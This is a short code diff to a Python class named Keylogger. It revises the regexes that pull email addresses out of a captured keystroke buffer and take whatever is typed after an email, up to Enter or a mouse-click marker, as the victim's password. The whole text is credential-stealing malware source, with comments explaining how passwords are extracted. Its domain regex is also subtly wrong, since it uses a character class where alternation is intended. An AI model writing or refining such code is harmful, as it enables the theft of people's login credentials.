@@ -67,16 +67,20 @@ class Keylogger:
         return INFO
 
     def __get_emails(self, buffer: str) -> list:
-        emails = re.findall("[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+", buffer)
+        emails = re.findall(
+            "[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[com|ca|net|org]+", buffer
+        )
 
         return emails
 
     def __get_passwords(self, buffer: str) -> list:
+        # find email with regex, get all the characters until enter or !CLICK(which is what we put as mouse click event)
         passwords_not_split = re.findall(
-            "[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[com|ca|net]+(.*[\n|!CLICK])", buffer
+            "[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[com|ca|net|org]+(.*[\n|!CLICK])", buffer
         )
         passwords = []
 
+        # split on the ! from !CLICK and append index 0 to the list of passwords
         for password in passwords_not_split:
             sub_strings = password.split("!")
             passwords.append(sub_strings[0])
